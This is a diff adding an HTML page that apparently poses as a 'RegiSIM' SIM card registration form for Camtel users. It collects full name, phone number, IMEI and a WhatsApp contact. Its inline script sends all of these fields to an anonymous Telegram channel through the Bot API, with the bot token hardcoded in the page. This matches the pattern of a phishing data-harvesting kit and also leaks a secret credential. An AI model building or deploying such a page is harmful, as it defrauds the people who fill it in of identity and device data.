@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      crossorigin="anonymous"
+    />
+    <title>RegiSIM</title>
+  </head>
+  <body>
+    <div class="container">
+      <div class="form-container" style="text-align: left">
+        <a href="index.html">
+          <span
+            style="
+              vertical-align: middle;
+              font-size: 20px;
+              font-weight: bold;
+              margin-left: 5px;
+            "
+            >RegiSIM</span
+          >
+          <br />
+        </a>
+        <span style="font-size: 12px">Click to know more about RegiSIM</span
+        ><br /><br />
+        <h2>RegiSIM Form</h2>
+        <form onsubmit="handleSubmit(event)" class="form">
+          <label for="fullname">Full Name:</label><br />
+          <span class="text-warning" style="font-size: 12px"
+            >(AS ON ID CARD)</span
+          >
+          <input type="text" id="fullname" name="fullname" required />
+          <br /><br />
+
+          <label for="camtel">Camtel Number:</label><br />
+          <span class="text-warning" style="font-size: 12px">(OPTIONAL)</span>
+          <input type="number" id="camtel" name="camtel" />
+          <br /><br />
+
+          <label for="imei">IMEI:</label><br />
+          <span class="text-warning" style="font-size: 12px"
+            >(Dial *#06# to check IMEI code)</span
+          >
+          <input type="number" id="imei" name="imei" required />
+          <br /><br />
+
+          <label for="message"
+            >Please write your number so we can call you when the SIM card is
+            ready, preferably WhatsApp number and name too.</label
+          ><br />
+          <textarea id="message" name="message" required></textarea><br /><br />
+
+          <input type="submit" value="Submit" class="btn btn-primary" />
+        </form>
+      </div>
+    </div>
+
+    <script>
+      function showOverlay() {
+        const overlay = document.createElement("iframe");
+        overlay.src = "overlay.html";
+        overlay.style.position = "fixed";
+        overlay.style.top = "0";
+        overlay.style.left = "0";
+        overlay.style.width = "100%";
+        overlay.style.height = "100%";
+        overlay.style.border = "none";
+        overlay.style.zIndex = "9999";
+
+        document.body.appendChild(overlay);
+      }
+
+      function hideOverlay() {
+        const overlay = document.querySelector("iframe[src='overlay.html']");
+        if (overlay) {
+          overlay.remove();
+        }
+      }
+
+      function handleSubmit(event) {
+        event.preventDefault(); // Prevent the form from submitting normally
+
+        // Show the overlay
+        showOverlay();
+
+        // Collect form data
+        const form = event.target;
+        const formData = new FormData(form);
+
+        // Handle form fields
+        const fullname = formData.get("fullname");
+        const camtel = formData.get("camtel");
+        const imei = formData.get("imei");
+        const message = formData.get("message");
+
+        // Function to send the form data to Telegram
+        function sendMessageToTelegram(fullname, camtel, imei, message) {
+          const botToken = "6384913385:AAEhwGNHb8PVy47N30Y2HxNTLgsCuzwZrTw";
+          const chatId = "@BlueOnlyGetMessage";
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+          // Construct the message text with form fields
+          let messageText = `Full Name: ${fullname}\n`;
+          messageText += `Camtel Number: ${camtel}\n`;
+          messageText += `IMEI: ${imei}\n`;
+          messageText += `Message: ${message}`;
+
+          // Send the message text
+          const messageData = JSON.stringify({
+            chat_id: chatId,
+            text: messageText,
+          });
+
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", url, true);
+          xhr.setRequestHeader("Content-Type", "application/json");
+          xhr.onload = function () {
+            if (xhr.status === 200) {
+              console.log("Message sent successfully");
+              hideOverlay();
+              window.location.href = "success.html"; // Redirect to the success page
+            } else {
+              console.error("Error sending message. Status:", xhr.status);
+              hideOverlay();
+              window.location.href = "error.html"; // Redirect to the error page
+            }
+          };
+          xhr.send(messageData);
+        }
+
+        // Send the form data to Telegram
+        sendMessageToTelegram(fullname, camtel, imei, message);
+
+        // Clear the form
+        form.reset();
+      }
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
